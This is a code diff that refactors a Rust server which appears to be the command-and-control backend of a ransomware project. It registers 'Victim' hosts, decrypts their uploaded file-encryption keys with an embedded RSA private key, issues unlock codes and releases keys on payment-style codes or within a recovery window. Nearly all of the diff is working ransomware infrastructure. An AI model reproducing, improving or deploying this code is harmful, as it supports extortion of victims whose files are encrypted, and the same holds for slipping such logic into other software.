@@ -8,7 +8,7 @@ use axum_embed::ServeEmbed;
 use axum_server::tls_rustls::RustlsConfig;
 use hex::{decode, encode};
 use log::{debug, error, info, warn};
-use purecrypto::rsa::RsaPrivateKey;
+use purecrypto::rsa::BoxedRsaPrivateKey;
 use rand::{RngExt, SeedableRng, rngs::StdRng};
 use rust_embed::RustEmbed;
 use std::{net::SocketAddr, sync::Arc, time::Duration, time::SystemTime};
@@ -19,11 +19,10 @@ mod models;
 
 use models::Victim;
 
-const RSA_LIMBS: usize = 32; // RSA key size in 64 bit limbs (2048 bits / 64 = 32)
-
 use coconut_crab_lib::{
     file::get_exe_path_dir,
     web::{
+        codes::RECOVERY_REQUEST_CODE,
         server_tls::{get_tls_private_key, get_tls_public_key},
         structs::{AnnounceCompletion, DownloadSymKey, Registration, UploadSymKey},
         validate::{
@@ -33,12 +32,10 @@ use coconut_crab_lib::{
     },
 };
 
-type RsaKey = RsaPrivateKey<RSA_LIMBS>;
-
 #[derive(Clone)]
 struct AppState {
     db: toasty::Db,
-    private_key: Arc<RsaKey>,
+    private_key: Arc<BoxedRsaPrivateKey>,
 }
 
 #[derive(RustEmbed, Clone)]
@@ -72,7 +69,6 @@ async fn main() {
         .expect("Failed to push database schema");
     debug!("Database schema pushed");
 
-    // Parse the RSA private key once at startup and cache it.
     let pem = String::from_utf8(
         AssetPrivate::get("asym-priv-key.pem")
             .expect("Failed to get private RSA key file")
@@ -80,7 +76,8 @@ async fn main() {
             .to_vec(),
     )
     .expect("Failed to read PEM file");
-    let private_key = Arc::new(RsaKey::from_pkcs1_pem(&pem).expect("Failed to parse PEM key"));
+    let private_key =
+        Arc::new(BoxedRsaPrivateKey::from_pkcs1_pem(&pem).expect("Failed to parse PEM key"));
     debug!("RSA private key parsed and cached");
 
     let shared_state = AppState { db, private_key };
@@ -97,7 +94,6 @@ async fn main() {
         .with_state(shared_state);
     debug!("Routing Configured");
 
-    // Graceful shutdown handle
     let handle = axum_server::Handle::new();
     let server_handle = handle.clone();
     tokio::spawn(async move {
@@ -119,8 +115,8 @@ async fn main() {
         let terminate = std::future::pending::<()>();
 
         tokio::select! {
-            _ = ctrl_c => {},
-            _ = terminate => {},
+            () = ctrl_c => {},
+            () = terminate => {},
         }
 
         info!("Received termination signal, starting graceful shutdown");
@@ -156,9 +152,9 @@ async fn main() {
 
 fn generate_code() -> String {
     let mut rng = StdRng::from_rng(&mut rand::rng());
-    let code: String = (0..4)
-        .flat_map(|i| {
-            let mut segment = String::with_capacity(4);
+    let code = loop {
+        let mut code = String::with_capacity(19);
+        for i in 0..4 {
             for _ in 0..4 {
                 let random_char = rng.random_range(0..62);
                 let c = if random_char < 10 {
@@ -168,14 +164,17 @@ fn generate_code() -> String {
                 } else {
                     (b'a' + (random_char - 36)) as char
                 };
-                segment.push(c);
+                code.push(c);
             }
             if i < 3 {
-                segment.push('-');
+                code.push('-');
             }
-            segment.chars().collect::<Vec<_>>()
-        })
-        .collect();
+        }
+        if code != RECOVERY_REQUEST_CODE {
+            break code;
+        }
+        debug!("Generated the reserved recovery sentinel by chance; regenerating");
+    };
     debug!("Generated new code: {code}");
     code
 }
@@ -184,7 +183,7 @@ fn get_epoch_time() -> i64 {
     match SystemTime::now().duration_since(SystemTime::UNIX_EPOCH) {
         Ok(time) => {
             debug!("Reported Time: {time:?}");
-            time.as_secs() as i64
+            time.as_secs().cast_signed()
         }
         Err(error) => {
             error!("Reported time before UNIX Epoch: {error}");
@@ -193,7 +192,7 @@ fn get_epoch_time() -> i64 {
     }
 }
 
-fn decrypt_key(private_key: &RsaKey, key: &str) -> Result<String, &'static str> {
+fn decrypt_key(private_key: &BoxedRsaPrivateKey, key: &str) -> Result<String, &'static str> {
     let key_vec = match decode(key) {
         Ok(bytes) => {
             debug!("Decoded Key: {bytes:?}");
@@ -244,12 +243,8 @@ async fn register(
         return Err((StatusCode::BAD_REQUEST, "Invalid Proof"));
     }
 
-    let mut proof_source = [registration.id.as_bytes(), registration.hostname.as_bytes()].concat();
-    if !check_proof(
-        &mut proof_source,
-        config::PRESHARED_SECRET,
-        &registration.proof,
-    ) {
+    let proof_source = [registration.id.as_bytes(), registration.hostname.as_bytes()].concat();
+    if !check_proof(&proof_source, config::PRESHARED_SECRET, &registration.proof) {
         warn!(
             "[{}] Proof Verification Failure: {}",
             registration.id, registration.proof
@@ -263,31 +258,36 @@ async fn register(
 
     let mut db = state.db.clone();
 
-    let victim_exists = Victim::get_by_id(&mut db, &registration.id).await.is_ok();
-
-    if victim_exists {
-        warn!("[{}] Existing Victim Found", registration.id);
-        warn!("[{}] Cannot Register New Victim", registration.id);
-        Err((StatusCode::CONFLICT, "Victim already exists"))
-    } else {
-        info!("[{}] Adding New Victim", registration.id);
-        if let Err(err) = toasty::create!(Victim {
-            id: registration.id.clone(),
-            hostname: registration.hostname.clone(),
-            key: String::new(),
-            code: String::new(),
-            upload_time: 0,
-            complete: false,
-        })
-        .exec(&mut db)
-        .await
-        {
-            error!("[{}] Failed to insert victim: {err}", registration.id);
-            return Err((StatusCode::INTERNAL_SERVER_ERROR, "Database error"));
+    info!("[{}] Adding New Victim", registration.id);
+    if let Err(err) = toasty::create!(Victim {
+        id: registration.id.clone(),
+        hostname: registration.hostname.clone(),
+        key: String::new(),
+        code: String::new(),
+        upload_time: 0,
+        complete: false,
+    })
+    .exec(&mut db)
+    .await
+    {
+        if err.is_driver_operation_failed() {
+            let err_str = err.to_string().to_lowercase();
+            if err_str.contains("unique")
+                || err_str.contains("primary key")
+                || err_str.contains("duplicate")
+            {
+                warn!(
+                    "[{}] Existing Victim Found (duplicate key)",
+                    registration.id
+                );
+                return Err((StatusCode::CONFLICT, "Victim already exists"));
+            }
         }
-        debug!("Inserted new victim into database");
-        Ok("Success")
+        error!("[{}] Failed to insert victim: {err}", registration.id);
+        return Err((StatusCode::INTERNAL_SERVER_ERROR, "Database error"));
     }
+    debug!("Inserted new victim into database");
+    Ok("Success")
 }
 
 async fn upload_sym_key(
@@ -314,12 +314,8 @@ async fn upload_sym_key(
         return Err((StatusCode::BAD_REQUEST, "Invalid Proof"));
     }
 
-    let mut proof_source = [uploadsymkey.id.as_bytes(), uploadsymkey.key.as_bytes()].concat();
-    if !check_proof(
-        &mut proof_source,
-        config::PRESHARED_SECRET,
-        &uploadsymkey.proof,
-    ) {
+    let proof_source = [uploadsymkey.id.as_bytes(), uploadsymkey.key.as_bytes()].concat();
+    if !check_proof(&proof_source, config::PRESHARED_SECRET, &uploadsymkey.proof) {
         warn!(
             "[{}] Proof Verification Failure: {}",
             uploadsymkey.id, uploadsymkey.proof
@@ -333,13 +329,10 @@ async fn upload_sym_key(
 
     let mut db = state.db.clone();
 
-    let mut victim = match Victim::get_by_id(&mut db, &uploadsymkey.id).await {
-        Ok(victim) => victim,
-        Err(_) => {
-            warn!("[{}] Existing Victim Not Found", uploadsymkey.id);
-            warn!("[{}] Cannot Upload Symmetric Key", uploadsymkey.id);
-            return Err((StatusCode::NOT_FOUND, "Victim does not exist"));
-        }
+    let Ok(mut victim) = Victim::get_by_id(&mut db, &uploadsymkey.id).await else {
+        warn!("[{}] Existing Victim Not Found", uploadsymkey.id);
+        warn!("[{}] Cannot Upload Symmetric Key", uploadsymkey.id);
+        return Err((StatusCode::NOT_FOUND, "Victim does not exist"));
     };
 
     let code = generate_code();
@@ -357,12 +350,12 @@ async fn upload_sym_key(
         return Err((StatusCode::INTERNAL_SERVER_ERROR, "Database error"));
     }
 
-    info!("[{}] Added Symmetric Key: {}", uploadsymkey.id, victim.key);
-    info!("[{}] Added Code: {}", uploadsymkey.id, victim.code);
     info!(
-        "[{}] Added Upload Time: {}",
-        uploadsymkey.id, victim.upload_time
+        "[{}] Added Symmetric Key: {}",
+        uploadsymkey.id, uploadsymkey.key
     );
+    info!("[{}] Added Code: {}", uploadsymkey.id, code);
+    info!("[{}] Added Upload Time: {}", uploadsymkey.id, upload_time);
 
     Ok("Success")
 }
@@ -386,9 +379,9 @@ async fn announce_completion(
         return Err((StatusCode::BAD_REQUEST, "Invalid Proof"));
     }
 
-    let mut proof_source = announcecompletion.id.as_bytes().to_vec();
+    let proof_source = announcecompletion.id.as_bytes().to_vec();
     if !check_proof(
-        &mut proof_source,
+        &proof_source,
         config::PRESHARED_SECRET,
         &announcecompletion.proof,
     ) {
@@ -405,13 +398,10 @@ async fn announce_completion(
 
     let mut db = state.db.clone();
 
-    let mut victim = match Victim::get_by_id(&mut db, &announcecompletion.id).await {
-        Ok(victim) => victim,
-        Err(_) => {
-            warn!("[{}] Existing Victim Not Found", announcecompletion.id);
-            warn!("[{}] Cannot Announce Completion", announcecompletion.id);
-            return Err((StatusCode::NOT_FOUND, "Victim does not exist"));
-        }
+    let Ok(mut victim) = Victim::get_by_id(&mut db, &announcecompletion.id).await else {
+        warn!("[{}] Existing Victim Not Found", announcecompletion.id);
+        warn!("[{}] Cannot Announce Completion", announcecompletion.id);
+        return Err((StatusCode::NOT_FOUND, "Victim does not exist"));
     };
 
     info!("[{}] Designating As Complete", announcecompletion.id);
@@ -454,9 +444,9 @@ async fn download_sym_key(
         return Err((StatusCode::BAD_REQUEST, "Invalid Proof"));
     }
 
-    let mut proof_source = [downloadsymkey.id.as_bytes(), downloadsymkey.code.as_bytes()].concat();
+    let proof_source = [downloadsymkey.id.as_bytes(), downloadsymkey.code.as_bytes()].concat();
     if !check_proof(
-        &mut proof_source,
+        &proof_source,
         config::PRESHARED_SECRET,
         &downloadsymkey.proof,
     ) {
@@ -473,23 +463,20 @@ async fn download_sym_key(
 
     let mut db = state.db.clone();
 
-    let existing_victim = match Victim::get_by_id(&mut db, &downloadsymkey.id).await {
-        Ok(victim) => {
-            debug!(
-                "[{}] Existing Victim Found: {:?}",
-                downloadsymkey.id, victim
-            );
-            victim
-        }
-        Err(_) => {
-            warn!("[{}] Existing Victim Not Found", downloadsymkey.id);
-            warn!("[{}] Cannot Download Symmetric Key", downloadsymkey.id);
-            return Err((StatusCode::NOT_FOUND, "Victim does not exist"));
-        }
+    let existing_victim = if let Ok(victim) = Victim::get_by_id(&mut db, &downloadsymkey.id).await {
+        debug!(
+            "[{}] Existing Victim Found: {:?}",
+            downloadsymkey.id, victim
+        );
+        victim
+    } else {
+        warn!("[{}] Existing Victim Not Found", downloadsymkey.id);
+        warn!("[{}] Cannot Download Symmetric Key", downloadsymkey.id);
+        return Err((StatusCode::NOT_FOUND, "Victim does not exist"));
     };
 
     let mut recovery_valid = false;
-    if !existing_victim.complete && downloadsymkey.code == "0000-0000-0000" {
+    if !existing_victim.complete && downloadsymkey.code == RECOVERY_REQUEST_CODE {
         info!("[{}] Key Recovery Requested", downloadsymkey.id);
         if existing_victim.upload_time == 0 {
             error!("[{}] No Upload Time Recorded", downloadsymkey.id);
@@ -499,7 +486,7 @@ async fn download_sym_key(
                 "[{}] Current Epoch Time: {} seconds",
                 downloadsymkey.id, current_time
             );
-            let recovery_window = config::RECOVERY_WINDOW * 60;
+            let recovery_window = config::RECOVERY_WINDOW_SECONDS;
             debug!(
                 "[{}] Key Recovery Window: {} seconds",
                 downloadsymkey.id, recovery_window
@@ -509,7 +496,7 @@ async fn download_sym_key(
                 "[{}] Elapsed Time: {} seconds",
                 downloadsymkey.id, elapsed_time
             );
-            if elapsed_time <= recovery_window as i64 {
+            if elapsed_time <= recovery_window.cast_signed() {
                 recovery_valid = true;
             }
         }
